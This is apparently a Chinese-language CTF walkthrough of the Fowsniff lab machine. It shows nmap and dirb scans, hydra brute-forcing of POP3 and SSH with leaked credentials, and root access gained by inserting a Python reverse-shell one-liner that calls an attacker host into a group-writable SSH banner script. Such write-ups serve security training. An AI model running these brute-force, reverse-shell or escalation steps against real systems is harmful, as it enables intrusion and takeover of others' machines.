

## 端口扫描
```bash
┌─[fforu@parrot]─[~/workspace]
└──╼ $sudo nmap --min-rate 9999 -p- 10.10.10.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-28 00:17 EST
Nmap scan report for 10.10.10.3
Host is up (0.00090s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
143/tcp open  imap
MAC Address: 00:0C:29:13:8A:EC (VMware)

┌─[fforu@parrot]─[~/workspace]
└──╼ $sudo nmap -sT -sCV -O -p 22,80,110,143 10.10.10.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-28 00:26 EST
Nmap scan report for 10.10.10.3
Host is up (0.00046s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
| http-robots.txt: 1 disallowed entry 
|_/
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: PIPELINING TOP AUTH-RESP-CODE SASL(PLAIN) UIDL USER CAPA RESP-CODES
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: ID Pre-login IDLE more AUTH=PLAINA0001 SASL-IR LOGIN-REFERRALS LITERAL+ have capabilities listed ENABLE post-login OK IMAP4rev1
MAC Address: 00:0C:29:13:8A:EC (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (98%), Linux 3.10 - 4.11 (95%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (95%), Sony Android TV (Android 5.0) (95%), Linux 3.2 - 3.16 (95%), Linux 3.18 (94%), Android 4.0 (94%), Android 5.1 (94%), Android 7.1.2 (Linux 3.4) (94%), Linux 3.12 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.62 seconds
```

## 目录扫描

目录扫描用gobuster会报很多错
看的不清晰
用的dirb
```bash
┌─[fforu@parrot]─[~/workspace]
└──╼ $sudo dirb http://10.10.10.3/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Feb 28 00:49:40 2024
URL_BASE: http://10.10.10.3/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.3/ ----
==> DIRECTORY: http://10.10.10.3/assets/                                                                                                                                                  
==> DIRECTORY: http://10.10.10.3/images/                                                                                                                                                  
+ http://10.10.10.3/index.html (CODE:200|SIZE:2629)                                                                                                                                       
+ http://10.10.10.3/robots.txt (CODE:200|SIZE:26)                                                                                                                                         
+ http://10.10.10.3/server-status (CODE:403|SIZE:298)                                                                                                                                     
                                                                                                                                                                                          
---- Entering directory: http://10.10.10.3/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                          
---- Entering directory: http://10.10.10.3/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Wed Feb 28 00:49:44 2024
DOWNLOADED: 4612 - FOUND: 3

┌─[fforu@parrot]─[~/workspace]
└──╼ $sudo dirb http://10.10.10.3/ -X .html,.txt,.rar,.zip,.php

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Feb 28 00:50:52 2024
URL_BASE: http://10.10.10.3/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.html,.txt,.rar,.zip,.php) | (.html)(.txt)(.rar)(.zip)(.php) [NUM = 5]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.3/ ----
+ http://10.10.10.3/index.html (CODE:200|SIZE:2629)                                                                                                                                       
+ http://10.10.10.3/LICENSE.txt (CODE:200|SIZE:17128)                                                                                                                                     
+ http://10.10.10.3/README.txt (CODE:200|SIZE:1288)                                                                                                                                       
+ http://10.10.10.3/robots.txt (CODE:200|SIZE:26)                                                                                                                                         
+ http://10.10.10.3/security.txt (CODE:200|SIZE:459)    

```

这里扫到了一些隐藏信息
都下载下来

## web渗透

查看源码可以得到cms的信息
![index](images/2024-02-28-13-55-12.png)
然而这里搜索了html5 up这个信息后并没有发现扫描有用信息
思路错了

## 信息收集
在首页的信息如下
![](images/2024-02-28-14-59-30.png)

这里提到了twitter信息
那么直接搜索该账号
得到如下信息
![](images/2024-02-28-15-03-22.png)
在账号下得到用户名及密码信息

![](images/2024-02-28-15-04-56.png)
根据提示，很明显可以知道
这是pop3的MD5格式的密码

## 密码破解
这里拿到密码稍微格式一下，简单破解一下md5就可以拿去爆破pop3了
```bash
┌─[✗]─[fforu@parrot]─[~/workspace]
└──╼ $sudo hydra -L user -P pass 10.10.10.3 pop3
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-28 02:19:14
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 72 login tries (l:9/p:8), ~5 tries per task
[DATA] attacking pop3://10.10.10.3:110/
[110][pop3] host: 10.10.10.3   login: seina   password: scoobydoo2
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-28 02:20:07
```

爆破成功
登录pop3

## pop3信息收集

```bash
┌─[fforu@parrot]─[~/workspace]
└──╼ $sudo nc 10.10.10.3 110
+OK Welcome to the Fowsniff Corporate Mail Server!
user seina
+OK
pass scoobydoo2
+OK Logged in.
list
+OK 2 messages:
1 1622
2 1280
retr 1 
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone


.
retr 2
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.
```

得到ssh连接的密码
The temporary password for SSH is "S1ck3nBluff+secureshell"
这就直接crackmapexec爆破了

## ssh登录

```bash
┌─[fforu@parrot]─[~/workspace]
└──╼ $sudo hydra -L user -P passwd 10.10.10.3 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-28 02:38:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:9/p:1), ~1 try per task
[DATA] attacking ssh://10.10.10.3:22/
[22][ssh] host: 10.10.10.3   login: baksteen   password: S1ck3nBluff+secureshell
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-28 02:38:12
```

hydra爆破得到了用户名和密码
```bash
┌─[fforu@parrot]─[~/workspace]
└──╼ $sudo ssh baksteen@10.10.10.3
The authenticity of host '10.10.10.3 (10.10.10.3)' can't be established.
ED25519 key fingerprint is SHA256:KZLP3ydGPtqtxnZ11SUpIwqMdeOUzGWHV+c3FqcKYg0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.3' (ED25519) to the list of known hosts.
baksteen@10.10.10.3's password: 
Permission denied, please try again.
baksteen@10.10.10.3's password: 

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


New release '18.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
baksteen@fowsniff:~$ 
```



## ssh banner脚本提权

用linpeas可以找到一个组可写入的sh脚本
看来一下就是
```bash
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions
```
这个东西

常规寻找思路

id发现属于两个组

`find / -group users -type f 2>/dev/null`

![](images/2024-02-28-16-22-58.png)

那么这个脚本的作用就是每次登录ssh都执行一次

加入反弹shell语句开启监听即可
```bash
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```bash
┌─[fforu@parrot]─[~/workspace]
└──╼ $sudo nc -lvnp 1234
[sudo] fforu 的密码：
listening on [any] 1234 ...
connect to [10.10.10.4] from (UNKNOWN) [10.10.10.3] 47796
# whoami 
whoami
root
# ls /root 
ls /root
Maildir  flag.txt
# cat /root/flag.txt
cat /root/flag.txt
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
```